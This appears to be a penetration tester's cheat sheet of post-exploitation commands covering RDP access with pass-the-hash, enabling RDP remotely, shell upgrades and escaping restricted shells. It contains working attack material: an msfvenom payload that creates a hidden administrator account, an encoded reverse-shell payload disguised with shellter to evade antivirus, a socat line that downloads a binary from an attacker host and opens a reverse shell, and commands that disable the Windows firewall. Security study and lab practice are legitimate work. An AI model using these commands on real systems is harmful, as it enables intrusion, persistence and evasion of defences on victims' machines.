---
description: chown chmod su ; windows prefer C:\ instead of /
---

# Common Operations (tty, SSH, rbash)

{% embed url="https://www.revshells.com/" %}
generate shell
{% endembed %}

### rdp

{% code overflow="wrap" %}
```

proxychains xfreerdp /d:sandbox(.local) /u:alex /p:'xxx' /v:10.5.5.20 +clipboard +drives /tls-seclevel:0

/pth:hash <-> /p:'pwd'

sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable
(-H nthash)
```
{% endcode %}

{% hint style="info" %}
Check "[File transfer](general/common-operations-tty-ssh-rbash/file-transfer.md#xfreerdp-drive-share-or-just-host-on-http-ser-and-browse-to-download)" for drive share
{% endhint %}

{% embed url="https://github.com/andrew-d/static-binaries/tree/master/binaries" %}
Link for wget correct architecture of useful tools onto victim
{% endembed %}

Setup nc listener with a opened port from nmap to avoid firewall block from victim

{% embed url="https://cheatsheet.haax.fr/shells-methods/reverse/" %}
rev shell methods
{% endembed %}

<pre data-overflow="wrap"><code><strong>
</strong><strong>msfvenom -p windows/exec CMD="cmd.exe /c net user /add pwn pwd &#x26;&#x26; net localgroup administrators pwn /add &#x26;&#x26; net localgroup \"Remote Desktop Users\" pwn /add" -a x86 -f exe --platform windows > X.exe
</strong><strong>
</strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.173 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw -o shell.bin
#shellter custom payload to avoid av
shellter A > N > C > .bin > N 
</code></pre>

### TTY interactive shell

<pre><code>/usr/bin/script -qc /bin/bash /dev/null

python2 -c 'import pty;pty.spawn("/bin/bash")'

python3 -c 'import pty;pty.spawn("/bin/bash")'

<strong>python -c 'import pty; pty.spawn("/bin/sh")'
</strong></code></pre>

#### full interactive

{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" %}

{% embed url="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/gaining-tty.rst" %}

socat

{% code overflow="wrap" %}
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.125:143

wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
wget -q http://192.168.119.125/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.125:143
```
{% endcode %}

nc

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ echo $TERM; stty size; stty raw -echo; fg #note the value
#*enter*2

# In reverse shell
$ reset
# 
$ export SHELL=bash
$ export TERM=xterm-256color #value from b4
$ stty rows <num> columns <cols> #value from b4
```

### PATH and SHELL fix

```

export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash:$SHELL

#prioritized /tmp script path
export PATH=/tmp:$PATH
```

### .c compiling

{% hint style="info" %}
add `-static` if `version GLIBC not found` error
{% endhint %}

```bash
gcc ###.c -o {outputname}
```

```
# old glibc compatibility 
gcc (-m32) -Wl,--hash-style=both (-static) -o exploit ###.c
```

### Compatible SSH

{% code overflow="wrap" %}
```
ssh who@10.11.1.141 -p 22 -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa
```
{% endcode %}

### Interactive session (escape rbash)

<pre><code>ssh alfred@10.11.1.101 -t "bash --noprofile" 

<strong>find /usr/bin/ -name find -exec /bin/bash -ip \; 
</strong><strong>
</strong><strong>ls $PATH (for available commands)
</strong><strong>
</strong><strong>vi
</strong><strong>:shell=/bin/sh
</strong><strong>:shell
</strong></code></pre>

### Windows  short path when can't use ""

{% embed url="https://superuser.com/questions/348079/how-can-i-find-the-short-path-of-a-windows-directory-file" %}

#### Windows firewall

```
netsh advfirewall set allprofiles state off
netsh advfirewall set allprofiles state on
```

#### reboot

```
shutdown -r -t 10
```
